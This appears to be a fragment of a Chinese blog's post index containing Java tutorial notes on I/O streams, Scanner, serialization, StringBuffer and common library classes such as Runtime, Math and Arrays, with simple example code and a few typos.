每一种流程处理都有一个文件处理类\n字节文件流都是字节流的直接子类，而字符流中的两个文件操作留都是转换流的子类\nJDK1.9后，使用transferTo()可以很方便的将输入流的数据保存到输出流\n内存操作流# 输入流\n输出流\n内存操作流是 Java 中用于在内存中读写数据的流。这些流允许你在内存中创建和操作数据，而不需要与文件系统或其他外部资源进行交互。内存操作流特别适用于临时数据处理和缓存数据。\n常见的内存操作流# ByteArrayInputStream：从内存中的字节数组读取数据。 ByteArrayOutputStream：将数据写入内存中的字节数组。 CharArrayReader：从内存中的字符数组读取数据。 CharArrayWriter：将数据写入内存中的字符数组。 示例代码# 使用 ByteArrayInputStream 和 ByteArrayOutputStream# 以下是一个简单的示例，展示了如何使用 ByteArrayInputStream 和 ByteArrayOutputStream 在内存中读写数据。\n示例 1：使用 ByteArrayOutputStream 写入数据# import java.io.ByteArrayOutputStream; import java.io.IOException; public class ByteArrayOutputStreamExample { public static void main(String[] args) { try { // 创建 ByteArrayOutputStream 对象 ByteArrayOutputStream baos = new ByteArrayOutputStream(); // 要写入的数据 String data = \u0026#34;Hello, World! This is a test message.\u0026#34;; // 将字符串转换为字节数组 byte[] bytes = data.getBytes(); // 写入数据到内存 baos.write(bytes); // 获取内存中的数据 byte[] result = baos.toByteArray(); // 打印结果 System.out.println(new String(result)); // 关闭流 baos.close(); } catch (IOException e) { e.printStackTrace(); } } } 示例 2：使用 ByteArrayInputStream 读取数据# import java.io.ByteArrayInputStream; import java.io.IOException; public class ByteArrayInputStreamExample { public static void main(String[] args) { try { // 要读取的数据 String data = \u0026#34;Hello, World! This is a test message.\u0026#34;; // 将字符串转换为字节数组 byte[] bytes = data.getBytes(); // 创建 ByteArrayInputStream 对象 ByteArrayInputStream bais = new ByteArrayInputStream(bytes); // 读取数据 int byteRead; while ((byteRead = bais.read()) != -1) { // 打印读取的字符 System.out.print((char) byteRead); } // 关闭流 bais.close(); } catch (IOException e) { e.printStackTrace(); } } } 解释# ByteArrayOutputStream# 创建 ByteArrayOutputStream 对象：使用 new ByteArrayOutputStream() 创建一个 ByteArrayOutputStream 对象。 写入数据：使用 baos.write(bytes) 方法将字节数组写入内存。 获取内存中的数据：使用 baos.toByteArray() 方法将内存中的数据转换为字节数组。 关闭流：使用 baos.close() 方法关闭输出流，释放系统资源。 ByteArrayInputStream# 创建 ByteArrayInputStream 对象：使用 new ByteArrayInputStream(bytes) 创建一个 ByteArrayInputStream 对象。 读取数据：使用 bais.read() 方法从内存中读取一个字节，直到返回 -1 表示数据读取完毕。 关闭流：使用 bais.close() 方法关闭输入流，释放系统资源。 其他内存操作流# CharArrayReader 和 CharArrayWriter# 这些类类似于 ByteArrayInputStream 和 ByteArrayOutputStream，但它们操作的是字符数组而不是字节数组。\n示例：使用 CharArrayWriter 写入数据# import java.io.CharArrayWriter; import java.io.IOException; public class CharArrayWriterExample { public static void main(String[] args) { try { // 创建 CharArrayWriter 对象 CharArrayWriter caw = new CharArrayWriter(); // 要写入的数据 String data = \u0026#34;Hello, World! This is a test message.\u0026#34;; // 写入数据到内存 caw.write(data); // 获取内存中的数据 String result = caw.toString(); // 打印结果 System.out.println(result); // 关闭流 caw.close(); } catch (IOException e) { e.printStackTrace(); } } } 示例：使用 CharArrayReader 读取数据# import java.io.CharArrayReader; import java.io.IOException; public class CharArrayReaderExample { public static void main(String[] args) { try { // 要读取的数据 String data = \u0026#34;Hello, World! This is a test message.\u0026#34;; // 将字符串转换为字符数组 char[] chars = data.toCharArray(); // 创建 CharArrayReader 对象 CharArrayReader car = new CharArrayReader(chars); // 读取数据 int charRead; while ((charRead = car.read()) != -1) { // 打印读取的字符 System.out.print((char) charRead); } // 关闭流 car.close(); } catch (IOException e) { e.printStackTrace(); } } } System类对I/O的支持# System类的3个I/O常量\nNo. 常量 类型 描述 1 public static final PrintStream err 常量 错误输出 2 public static final PrintStream out 常量 系统输出 3 public static final InputStream in 常量 系统输入 BufferedReader缓冲输入流# No. 方法 类型 描述 1 public BufferedReader(Reader in) 构造 接取一个Reader类的实例 2 public String readLine() throws IOException 普通 一次性从缓冲区中将内容全部读取出来 BufferedReader定义的构造方法只能接受字符输入的实例，所以必须使用字符输入转换成inputStreamReader类将字节输入流System.in变成字符流 BufferedReader 是 Java 标准库中的一个类，用于从字符输入流中高效地读取文本数据。它通过内部缓冲来提高读取效率，特别是对于大量文本数据的读取非常有用。BufferedReader 继承自 Reader 类，并提供了额外的方法来方便地读取行数据。\n主要特点# 缓冲机制：BufferedReader 使用内部缓冲区来减少对底层输入流的读取次数，从而提高读取效率。 读取行数据：提供了 readLine() 方法，可以方便地按行读取文本数据。 读取单个字符：提供了 read() 方法，可以读取单个字符。 读取多个字符：提供了 read(char[] cbuf, int off, int len) 方法，可以读取多个字符到字符数组中。 常见的构造方法# BufferedReader(Reader in)：创建一个新的缓冲读取器，使用默认大小的缓冲区。 BufferedReader(Reader in, int size)：创建一个新的缓冲读取器，使用指定大小的缓冲区。 示例代码# 以下是一个简单的示例，展示了如何使用 BufferedReader 从文件中读取文本数据。\n示例：使用 BufferedReader 读取文件# import java.io.BufferedReader; import java.io.FileReader; import java.io.IOException; public class BufferedReaderExample { public static void main(String[] args) { // 定义文件路径 String filePath = \u0026#34;example.txt\u0026#34;; try { // 创建 FileReader 对象 FileReader fr = new FileReader(filePath); // 包装成 BufferedReader 对象 BufferedReader br = new BufferedReader(fr); // 读取文件内容，按行读取 String line; while ((line = br.readLine()) != null) { // 打印读取的每一行 System.out.println(line); } // 关闭流 br.close(); } catch (IOException e) { e.printStackTrace(); } } } 解释# 创建 FileReader 对象：使用 new FileReader(filePath) 创建一个 FileReader 对象，用于从文件中读取字符数据。\n包装成 BufferedReader 对象：使用 new BufferedReader(fr) 创建一个 BufferedReader 对象，以提高读取效率。\n读取文件内容\n：\n使用 br.readLine() 方法按行读取文件内容。该方法返回读取的行，如果到达文件末尾则返回 null。 使用 while 循环不断读取行数据，直到读取到 null 表示文件结束。 关闭流：使用 br.close() 方法关闭缓冲读取器，释放系统资源。\n常用方法# String readLine()：读取一行文本。返回的字符串不包含任何行终止符（如 \\n 或 \\r\\n）。如果到达文件末尾则返回 null。 int read()：读取一个字符，返回读取的字符值，如果到达文件末尾则返回 -1。 int read(char[] cbuf, int off, int len)：读取最多 len 个字符，并将其存储在字符数组 cbuf 中，从偏移量 off 开始。 void close()：关闭此缓冲读取器并释放与之关联的所有系统资源。 long skip(long n)：跳过并丢弃此输入流中的 n 个字符。 注意事项# 异常处理：调用 readLine()、read() 等方法可能会抛出 IOException，因此需要在 try-catch 块中处理异常。 资源管理：务必在不再需要时关闭流，以释放系统资源。可以使用 try-with-resources 语句来自动管理资源。 使用 try-with-resources 语句# import java.io.BufferedReader; import java.io.FileReader; import java.io.IOException; public class BufferedReaderExample { public static void main(String[] args) { // 定义文件路径 String filePath = \u0026#34;example.txt\u0026#34;; try (FileReader fr = new FileReader(filePath); BufferedReader br = new BufferedReader(fr)) { // 读取文件内容，按行读取 String line; while ((line = br.readLine()) != null) { // 打印读取的每一行 System.out.println(line); } } catch (IOException e) { e.printStackTrace(); } } } # Scanner# Scanner 是 Java 标准库中的一个类，用于解析基本类型和字符串的输入。它可以从标准输入（如键盘输入）、文件、字符串等输入源读取数据，并提供了丰富的解析方法，使得输入处理变得更加方便和灵活。\n构造方法# Scanner(InputStream source)：从输入流中读取数据。 Scanner(File source)：从文件中读取数据。 Scanner(Path source)：从路径中读取数据。 Scanner(String source)：从字符串中读取数据。 Scanner(Readable source)：从可读对象中读取数据。 常用方法# next()：读取下一个完整的标记（token），默认分隔符是空白字符（空格、制表符、换行符等）。 nextLine()：读取下一行文本，包括换行符。 nextInt()：读取下一个整数。 nextDouble()：读取下一个双精度浮点数。 nextBoolean()：读取下一个布尔值。 hasNext()：判断是否还有下一个标记。 hasNextLine()：判断是否还有下一行文本。 hasNextInt()：判断是否还有下一个整数。 hasNextDouble()：判断是否还有下一个双精度浮点数。 hasNextBoolean()：判断是否还有下一个布尔值。 useDelimiter(Pattern pattern)：设置分隔符模式。 close()：关闭扫描器，释放相关资源。 示例代码# 以下是一些使用 Scanner 的示例，展示了如何从不同输入源读取数据。\n示例 1：从标准输入读取数据\nimport java.util.Scanner; public class ScannerExample1 { public static void main(String[] args) { // 创建 Scanner 对象，从标准输入读取数据 Scanner scanner = new Scanner(System.in); System.out.println(\u0026#34;请输入您的姓名：\u0026#34;); String name = scanner.nextLine(); System.out.println(\u0026#34;请输入您的年龄：\u0026#34;); int age = scanner.nextInt(); System.out.println(\u0026#34;请输入您的身高（米）：\u0026#34;); double height = scanner.nextDouble(); System.out.println(\u0026#34;您好，\u0026#34; + name + \u0026#34;，您今年 \u0026#34; + age + \u0026#34; 岁，身高 \u0026#34; + height + \u0026#34; 米。\u0026#34;); // 关闭扫描器 scanner.close(); } } 示例 2：从文件读取数据\nimport java.io.File; import java.io.FileNotFoundException; import java.util.Scanner; public class ScannerExample2 { public static void main(String[] args) { // 定义文件路径 String filePath = \u0026#34;data.txt\u0026#34;; try { // 创建 Scanner 对象，从文件读取数据 Scanner scanner = new Scanner(new File(filePath)); // 读取文件内容 while (scanner.hasNextLine()) { String line = scanner.nextLine(); System.out.println(line); } // 关闭扫描器 scanner.close(); } catch (FileNotFoundException e) { e.printStackTrace(); } } } 示例 3：从字符串读取数据# import java.util.Scanner; public class ScannerExample3 { public static void main(String[] args) { // 定义字符串 String input = \u0026#34;John Doe 25 1.75\u0026#34;; // 创建 Scanner 对象，从字符串读取数据 Scanner scanner = new Scanner(input); // 读取数据 String name = scanner.next(); String lastName = scanner.next(); int age = scanner.nextInt(); double height = scanner.nextDouble(); System.out.println(\u0026#34;姓名：\u0026#34; + name + \u0026#34; \u0026#34; + lastName); System.out.println(\u0026#34;年龄：\u0026#34; + age); System.out.println(\u0026#34;身高：\u0026#34; + height); // 关闭扫描器 scanner.close(); } } 解释# 创建 Scanner 对象： 从标准输入读取数据：使用 new Scanner(System.in) 创建一个 Scanner 对象，从标准输入读取数据。 从文件读取数据：使用 new Scanner(new File(filePath)) 创建一个 Scanner 对象，从文件读取数据。 从字符串读取数据：使用 new Scanner(input) 创建一个 Scanner 对象，从字符串读取数据。 读取数据： nextLine()：读取下一行文本。 nextInt()：读取下一个整数。 nextDouble()：读取下一个双精度浮点数。 next()：读取下一个完整的标记（token）。 判断是否有更多数据： hasNextLine()：判断是否还有下一行文本。 hasNextInt()：判断是否还有下一个整数。 hasNextDouble()：判断是否还有下一个双精度浮点数。 关闭扫描器：使用 scanner.close() 方法关闭扫描器，释放相关资源。 注意事项# 异常处理：在从文件读取数据时，可能会抛出 FileNotFoundException，因此需要在 try-catch 块中处理异常。 资源管理：务必在不再需要时关闭扫描器，以释放系统资源。可以使用 try-with-resources 语句来自动管理资源。 使用 try-with-resources 语句# import java.io.File; import java.io.FileNotFoundException; import java.util.Scanner; public class ScannerExample2 { public static void main(String[] args) { // 定义文件路径 String filePath = \u0026#34;data.txt\u0026#34;; try (Scanner scanner = new Scanner(new File(filePath))) { // 读取文件内容 while (scanner.hasNextLine()) { String line = scanner.nextLine(); System.out.println(line); } } catch (FileNotFoundException e) { e.printStackTrace(); } } } 注：# Scanner可以接收File,InputStream、Readable类型的输入实例，这样就可以使用统一标准实现数据的读取操作\nScanner默认将空字符作为分隔符，然而.txt文件中的内容是以换行符作为分隔符，所以为了正常数据读取，就必须利用useDelimiter()方法指定数据读取的分隔符。\nimport java.util.Scanner public class JavaDemo{ public static void main(String[] args) throws Exception{ Scanner scan = new Scanner(new File(xxx.txt)); scan.useDelimiter(\u0026#34;\\n\u0026#34;); while(scan.hasNext()){ System.out.println(scan.next()); } } } 对象序列化# 对象序列化就是把一个变成二进制数据留的一种方法\n一个类的对象要想实现序列化，则对象所在的类必须实现java.io.Serializable接口。然而这个接口没有提供任何抽象方法，只是一个标识接口，表示一种对象可以被序列化的能力\u0026mdash;\u0026ndash;\nJava 序列化和反序列化是将对象的状态保存到文件或传输到网络，并从文件或网络中恢复对象状态的过程。序列化将对象转换为字节流，而反序列化则是将字节流还原为对象。这在分布式系统、持久化存储和对象传输中非常有用。\n序列化# 序列化是指将对象的状态信息转换为可以存储或传输的形式。在 Java 中，可以通过实现 Serializable 接口来使对象支持序列化。\n实现 Serializable 接口\nimport java.io.Serializable; public class Person implements Serializable { private static final long serialVersionUID = 1L; // 可选，用于版本控制 private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } // Getters and Setters public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \u0026#34;Person{name=\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;, age=\u0026#34; + age + \u0026#34;}\u0026#34;; } } 序列化对象# 使用 ObjectOutputStream 将对象写入文件或输出流。\n示例：将对象序列化到文件\nimport java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializationExample { public static void main(String[] args) { // 创建一个 Person 对象 Person person = new Person(\u0026#34;John Doe\u0026#34;, 30); try { // 创建 FileOutputStream 对象 FileOutputStream fos = new FileOutputStream(\u0026#34;person.ser\u0026#34;); // 创建 ObjectOutputStream 对象 ObjectOutputStream oos = new ObjectOutputStream(fos); // 序列化对象 oos.writeObject(person); // 关闭流 oos.close(); fos.close(); System.out.println(\u0026#34;对象已成功序列化到文件: person.ser\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } 反序列化# 反序列化是指将字节流还原为对象。在 Java 中，可以通过 ObjectInputStream 从文件或输入流中读取对象。\n示例：从文件反序列化对象\nimport java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class DeserializationExample { public static void main(String[] args) { try { // 创建 FileInputStream 对象 FileInputStream fis = new FileInputStream(\u0026#34;person.ser\u0026#34;); // 创建 ObjectInputStream 对象 ObjectInputStream ois = new ObjectInputStream(fis); // 反序列化对象 Person person = (Person) ois.readObject(); // 关闭流 ois.close(); fis.close(); System.out.println(\u0026#34;对象已成功反序列化: \u0026#34; + person); } catch (IOException | ClassNotFoundException e) { e.printStackTrace(); } } } 注意事项# serialVersionUID：建议为每个实现 Serializable 接口的类定义一个 serialVersionUID，用于版本控制。如果不定义，默认会根据类的结构生成一个唯一的 serialVersionUID，这可能导致在类结构发生变化时无法正确反序列化。\n瞬态字段：使用 transient 关键字标记的字段不会被序列化。例如：\nprivate transient String password; 自定义序列化和反序列化：可以通过实现 writeObject 和 readObject 方法来自定义序列化和反序列化过程。例如：\nimport java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Person implements Serializable { private static final long serialVersionUID = 1L; private String name; private int age; private transient String password; public Person(String name, int age, String password) { this.name = name; this.age = age; this.password = password; } // Getters and Setters private void writeObject(ObjectOutputStream out) throws IOException { out.defaultWriteObject(); out.writeObject(password); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); password = (String) in.readObject(); } @Override public String toString() { return \u0026#34;Person{name=\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;, age=\u0026#34; + age + \u0026#34;, password=\u0026#39;\u0026#34; + password + \u0026#34;\u0026#39;}\u0026#34;; } } ObjectOutputStream类可以将对象转为特定格式的二进制数据输出\nObjectInputStream可以读取ObjectOutputStream类输出的二进制对象数据，并将其转为具体类型的对象返回。\nObjectOutputStream类常用方法# No. 方法 类型 描述 1 public ObjectOutputStream(OutputStream out) throws IOException 构造 传入输出的对象 2 public final void writeObject(Object obj) throws IOException 普通 输出对象 ObjectInputStream类常用方法# No. 方法 类型 描述 1 public ObjectInputStream(InputStream in) throws IOException 构造 构造输入对象 2 public final Object readObject() throws IOException,ClassNotFoundException 普通 从指定位置读取对象 拓展：# Java# 企业级应用：Java 序列化常用于企业级应用，如分布式系统、RPC（远程过程调用）和消息队列。 持久化存储：用于将对象状态保存到文件或数据库。 PHP# Web 应用：PHP 序列化常用于 Web 应用，如会话管理、缓存和配置文件。 数据交换：用于在不同系统之间传递数据。 ","date":"2024-11-21","id":8,"permalink":"/blog/io_programming/","summary":"输入流和输出流# 输入流（InputStream）\n输入流用于从数据源读取数据。常见的数据源包括文件、网络连接、内存中的字节数组等。InputStream 是所有字节输入流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的数据源。\n输出流（OutputStream）\n输出流用于将数据写入目标位置。常见的目标位置包括文件、网络连接、内存中的字节数组等。OutputStream 是所有字节输出流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的目标位置。\nFile文件操作# 初识# java.io.File类是一个与文件本身操作有关的类，此类可以实现文件创建、删除、重命名、取得文件大小、修改日期等常见系统文件操作\n如果要使用File类则必须提供完整的文件操作路径，对于文件路径的设置可以通过File类的构造方法完成，当获取了正确的文件路径后就可以进行文件创建于删除操作、File类文件基本操作方法\nNo. 方法 类型 描述 1 public File(String pathname) 构造 给定一个要操作文件的完整路径 2 public File(File parent,String child) 构造 给定要操作文件的父路径和子文件名称 3 public boolean createNewFile() throws IOException 普通 创建文件 4 public boolean delete() 普通 删除文件 5 public boolean exists() 普通 判断给定路径是否存在 示例\nimport java.io.File; public class JavaIODemo{ public static void main(String[] args) throws Exception{ File file = new File(\u0026#34;D:\\\\1.txt\u0026#34;); //文件路径: \u0026#34;\\\\\u0026#34;转义为\u0026#34;\\\u0026#34; if(file.exists()){ file.delete(); } else{ System.out.println(file.createNewFile()); } } } 分隔符# windows中是\u0026quot;\\\u0026quot; 而在UNIX或类UNIX操作系统中路径分隔符是\u0026quot;/\u0026quot;\n","tags":["Blog","Java Application Programming"],"title":"Io Programming"},{"content":"StringBuffer类# String和StringBuffer的区别# String\n不可变性：String 类是不可变的，这意味着一旦创建了一个 String 对象，其值就不能改变。每次对 String 进行修改（如连接、替换等操作）都会产生新的 String 对象，原来的对象不会被改变。 线程安全性：由于 String 的不可变性，它是线程安全的，可以被多个线程共享而无需担心数据一致性的问题。 性能：因为每次修改都会创建新的对象，所以在频繁进行字符串操作时，String 的效率较低。 StringBuffer\n可变性：StringBuffer 是一个可变的字符序列，可以被多次修改而不创建新的对象。这意味着如果需要对字符串进行大量的修改操作，使用 StringBuffer 比使用 String 更加高效。 线程安全性：StringBuffer 是线程安全的。它的方法都是同步的（即加了 synchronized 关键字），这使得 StringBuffer 可以在多线程环境中安全地使用，但是也导致了它的性能相比非线程安全的 StringBuilder 要差一些。 性能：当需要在一个单线程环境下进行大量字符串操作时，StringBuffer 仍然不是最优选择，因为它的线程安全特性会带来额外的开销。在这种情况下，应该考虑使用 StringBuilder。 使用场景\n使用 String：当你不需要修改字符串内容时，或者修改次数非常少的时候，使用 String 是合适的。此外，String 的不可变性和线程安全性使其成为多线程环境中的首选。 使用 StringBuffer：如果你的应用程序需要在多线程环境中频繁地修改字符串，那么 StringBuffer 是一个很好的选择，因为它提供了线程安全的操作。 使用 StringBuilder：对于单线程环境下的频繁字符串操作，推荐使用 StringBuilder，因为它比 StringBuffer 性能更高，同时又保持了可变性的优点。 StringBuffer介绍# String类自身有一个最大的缺陷：内容一旦声明则不可改变，JDK为了方便用户修改字符串内容提供了StringBuffer类\nStringBuffer类不像String类那样可以直接通过声明字符串常量方式进行实例化，而是必须像普通类对象使用一样，首先通过构造方法进行对象实例化，而后才可以调用方法进行处理。\nNo. 方法 类型 描述 1 public StringBuffer() 构造 创建一个空的StringBuffer对象 2 public StringBuffer(String str) 构造 将接受到的String内容变为StringBuffer内容 3 public StringBuffer append(数据类型 变量) 普通 内容连接，等价于String中：”+”操作 4 public StringBuffer insert(int offset,数据类型 变量) 普通 在指定索引位置处插入数据 5 public StringBuffer delete(int start,int end) 普通 删除指定索引范围之内的数据 6 public StringBuffer reverse() 普通 内容反转 示例\npublic class JavaDome{ public static void main(String args[]){ StringBuffer buf = new StringBuffer(\u0026#34;hello\u0026#34;); change(buf); String data = StringBuffer.toString(); //将StringBuffer变为String实例 System.out.println(data); } } public static void change(StringBffer temp){ temp.append(\u0026#34;world\u0026#34;).append(\u0026#34;!\u0026#34;); } 实际上使用： String strB = \u0026#34;hello\u0026#34;+\u0026#34;world\u0026#34;+\u0026#34;!\u0026#34; 程序编译后的结果全部等价于以下操作： StringBuffer buf = new StringBuffer(); buf.append(\u0026#34;hello\u0026#34;).append(\u0026#34;world\u0026#34;).append(\u0026#34;!\u0026#34;); 所有的\u0026#34;+\u0026#34;编译之后都变成了StringBuffer中append()方法 除了可以修改内容的能力外，还提供了一些String类所不具备的方法\n插入删除数据\nStringBuffer buf = new StringBuffer(); buf.append(\u0026#34;hello world\u0026#34;).delete(6,12).insert(6,\u0026#34;!\u0026#34;); 字符串反转\nStringBuffer buf = new StringBuffer(); buf.append(\u0026#34;hello\u0026#34;); System.out.println(buf.reverse()); CharSequence接口# 常见子类\nString、StringBuffer、StringBuilder 常见的方法\nNo. 方法 类型 描述 1 public char charAt(int index) 普通 获取指定索引字符 2 public int length() 普通 获取字符串长度 3 public CharSequence subSequence(int start,int end) 普通 截取部分字符串 使用示例\nCharSequence str = \u0026#34;hello\u0026#34;; //子类实例向父类接口转型 CharSequence sub = str.subSequence(4,8); //截取部分子字符串 //String类是CharSequence接口子类，所以本程序利用对象向上转型的操作通过字符串的匿名对象实现了CharSequece父接口对象实例化，随后调用subSequence()方法实现了子字符串的截取操作 注:\n开发中优先考虑String类，只有在频繁操作修改这一操作中才会考虑使用StringBuffer或StringBuilder\nAutoCloseable接口# 该接口的主要功能是结合异常处理结构在资源操作完成后实现自动释放功能\npublic interface AutoCloseale{ public void close() throws Exception;//资源释放 } Runtime类# Runtime描述的是运行时的状态，在每一个JVM进程中都会提供唯一的一个Runtime类实例化对象。\n可以利用Runtime类对象获取与JVM有关的运行时状态。\n由于Runtime类中只存在一个实例化对象，所以在Runtime类中默认将默认将其构造方法封装（单例设计模式），这样就必须用Runtime类中提供的getRuntime()方法(为static方法)来获取实例化对象，随后就可以获取一些系统相关的信息。\nNo. 方法 类型 描述 1 public static Runtime getRuntime() 普通 获取Rintime类的实例化对象 2 public int avaliableProcessors() 普通 获取可用的CPU处理器数量 3 public long maxMemory() 普通 取得最大可用内存量 4 public long totalMemory() 普通 取得总共可用内存量 5 public long freeMemory() 普通 取得空闲内存量 6 public void gc() 普通 运行垃圾收集器，释放垃圾空间 获取本机CPU处理器数量\npublic class JavaAPIDemo{ public static void main(String args) throws Exception{ Runtime runtime = Runtime.getRuntime(); //获取Runtime实例化对象 System.out.println(runtime.avaliableProcessors()); //获取处理器数量 } } 注： long型数据主要有两种情况，表示文件大小和表示日期时间\nSystem类# No. 方法 类型 描述 1 public static void arraycopy(Object src,int srcPos,Object destPos,int length) 普通 数组复制操作 2 public static long currentTimeMillis() 普通 取得当前的日期时间，以long型数据返回 3 public static void gc() 普通 执行GC操作 Cleaner类# 在java中对象的整个生命周期大致可以分为七个阶段：\n​\t创建阶段(Created)\n​\t应用阶段(In Use)\n​\t不可见阶段(Invisible)\n​\t不可达阶段(Unreachable)\n​\t收集阶段(Collected)\n​\t终结阶段(Finalized)\n​\t释放阶段(Free)\nMath数学计算# 程序开发本质就是数据处理，java提供有java.lang.Math类来帮助开发者进行常规的数学计算处理。\n例如，四舍五入，三角函数，乘方处理等\nMath.abs(-10.9) //绝对值 10.9 Math.max(10.2,20.3) //获取最大值 Math.log(5) //对数：1.60943... Math.round(15.1) //四舍五入 15 Math.round(-15.5) //四舍五入 -15 Math.round(-15.51) //四舍五入 -16 Math.pow(10.2,20.2) //乘方:2.36441... Rondom随机数# import java.util.Random\n设置一个随机数的范围边界就可以随机生成不大于此边界范围的正整数\n方法(随机生成正整数)：public int nextInt(int bound)\nRandom rand = new Random(); rand.nextInt(100); 大数字处理类# BigInteger# No. 方法 类型 描述 1 public BigInterger(String val) 构造 将一个字符串变成BigInterger类型数据 2 public BigInterger add(BigInterger val) 普通 加法计算 3 public BigInterger substract(BigInterger val) 普通 减法计算 4 public BigInterger multiply(BigInterger val) 普通 乘法计算 5 public BigInterger divideBigInterger val) 普通 除法计算 6 public BigInterger max(BigInterger val) 普通 返回两个大数字中的最大值 7 public BigInterger min(BigInterger val) 普通 返回两个大数字的最小值 8 public BigInteger[] divideAndRemainder(BigInterger val) 普通 除法操作，数组的第一个元素为除法的商，第二个元素为除法的余数 BigDecimal# No. 方法 类型 描述 1 public BigDecimal(double val) 构造 将double表示形式转换为BigDecimal 2 public BigDecimal(int val) 构造 将int表示形式转换为BigDecimal 3 public BigDecimal(String val) 构造 将字符串表示形式转换为BigDecimal 4 public BigDecimal add(BigDecimal augend) 普通 加法计算 5 public BigDecimal subtract(BigDecimal subtrahend) 普通 减法计算 6 public BigDecimal multiply(BigDecimal multiplicand) 普通 乘法计算 7 public BigDecimal divide(BigDecimal divisor) 普通 除法计算 8 public BigDecimal divide(BigDecimal divisor,int scale,RoundingMode roundingMode) 普通 除法计算设置保留下小数位与进位模式 Date日期处理类# No. 方法 类型 描述 1 public Date() 构造 实例化Date对象 2 public Date(long date) 构造 将数字变为Date类对象，long为日期时间数据 3 public long getTime() 普通 将当前的日期时间变为long型 SimpleDateForrmat日期格式化# 正则表达式# Arrays数组操作类# import java.util.Arrays\npublic class JavaApIDemo{ public static void main(String[] args) throws Exception{ int dataA[] = new int[] {1,2,3}; int dataB[] = new int[] {1,2,3}; System.out.println(Arrays.compare(dataA,dataB)); System.out.println(Arrays.equals(dataA,dataB)); int data[]C = new int[10]; Arrays.fill(dataC,3); //内容填充 System.out.println(Arrays.toString(dataC)); //数组转为字符串输出 } } No. 方法 类型 描述 1 public static void sort(数据类型[] 变量) 普通 数组排序 2 public static int binarySearch(数据类型[] 变量，数据类型 key) 普通 利用二分查找算法进行数据查询 3 public static int compare(数据类型[] 变量，数据类型[] 变量) 普通 比较两个数组的大小，返回3类结果：大于(1)、小于(-1)、等于(0) 4 public static boolean equals(数据类型[] 变量，数据类型[] 变量) 普通 数组相等判断 5 public static void fill(数据类型[] 变量，数据类型 变量) 普通 数组填充 6 public static String toString(数据类型[] 变量) 普通 数组转为字符串 异常结构# 以后慢慢遇到再补充吧！\n","date":"2024-11-20","id":9,"permalink":"/blog/java%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%BA%93/","summary":"StringBuffer类# String和StringBuffer的区别# String\n不可变性：String 类是不可变的，这意味着一旦创建了一个 String 对象，其值就不能改变。每次对 String 进行修改（如连接、替换等操作）都会产生新的 String 对象，原来的对象不会被改变。 线程安全性：由于 String 的不可变性，它是线程安全的，可以被多个线程共享而无需担心数据一致性的问题。 性能：因为每次修改都会创建新的对象，所以在频繁进行字符串操作时，String 的效率较低。 StringBuffer\n可变性：StringBuffer 是一个可变的字符序列，可以被多次修改而不创建新的对象。这意味着如果需要对字符串进行大量的修改操作，使用 StringBuffer 比使用 String 更加高效。 线程安全性：StringBuffer 是线程安全的。它的方法都是同步的（即加了 synchronized 关键字），这使得 StringBuffer 可以在多线程环境中安全地使用，但是也导致了它的性能相比非线程安全的 StringBuilder 要差一些。 性能：当需要在一个单线程环境下进行大量字符串操作时，StringBuffer 仍然不是最优选择，因为它的线程安全特性会带来额外的开销。在这种情况下，应该考虑使用 StringBuilder。 使用场景\n使用 String：当你不需要修改字符串内容时，或者修改次数非常少的时候，使用 String 是合适的。此外，String 的不可变性和线程安全性使其成为多线程环境中的首选。 使用 StringBuffer：如果你的应用程序需要在多线程环境中频繁地修改字符串，那么 StringBuffer 是一个很好的选择，因为它提供了线程安全的操作。 使用 StringBuilder：对于单线程环境下的频繁字符串操作，推荐使用 StringBuilder，因为它比 StringBuffer 性能更高，同时又保持了可变性的优点。 StringBuffer介绍# String类自身有一个最大的缺陷：内容一旦声明则不可改变，JDK为了方便用户修改字符串内容提供了StringBuffer类\nStringBuffer类不像String类那样可以直接通过声明字符串常量方式进行实例化，而是必须像普通类对象使用一样，首先通过构造方法进行对象实例化，而后才可以调用方法进行处理。\nNo. 方法 类型 描述 1 public StringBuffer() 构造 创建一个空的StringBuffer对象 2 public StringBuffer(String str) 构造 将接受到的String内容变为StringBuffer内容 3 public StringBuffer append(数据类型 变量) 普通 内容连接，等价于String中：”+”操作 4 public StringBuffer insert(int offset,数据类型 变量) 普通 在指定索引位置处插入数据 5 public StringBuffer delete(int start,int end) 普通 删除指定索引范围之内的数据 6 public StringBuffer reverse() 普通 内容反转 示例\n","tags":["Blog","Java Application Programming"],"title":"Java常用类库"},{"content":"java文件结构快速了解# Java 文件的基本结构# 一个简单的Java文件通常包含以下几个部分：\n包声明：\n每个Java源文件都属于某个包。包的作用类似于文件夹，用于组织和分类相关的类。 示例：package com.example; 导入语句：\n导入语句用于引入其他包中的类或接口，这样可以在当前文件中直接使用这些类或接口。 示例：import java.util.ArrayList; 类声明：\n类是Java程序的基本构建块。每个类定义了一组属性（变量）和方法（函数）。\n示例：\npublic class HelloWorld { // 类体 } 构造方法：\n构造方法是一种特殊的方法，用于创建类的新实例时初始化对象。\n示例：\npublic HelloWorld() { // 初始化代码 } 属性（成员变量）：\n属性是类中存储数据的变量。\n示例：\nprivate String name; 方法：\n方法是执行特定任务的代码块。\n示例：\npublic void sayHello() { System.out.println(\u0026#34;Hello, World!\u0026#34;); } 主方法（main方法）：\n主方法是Java应用程序的入口点。当程序启动时，JVM会寻找并执行这个方法。\n示例：\njava深色版本\npublic static void main(String[] args) { HelloWorld hello = new HelloWorld(); hello.sayHello(); } 示例代码# 以下是一个完整的Java文件示例，结合了上述各个部分：\njava深色版本\n// 包声明 package com.example; // 导入语句 import java.util.ArrayList; // 类声明 public class HelloWorld { // 成员变量 private String name; // 构造方法 public HelloWorld() { this.name = \u0026#34;World\u0026#34;; } // 普通方法 public void sayHello() { System.out.println(\u0026#34;Hello, \u0026#34; + name); } // 主方法 public static void main(String[] args) { HelloWorld hello = new 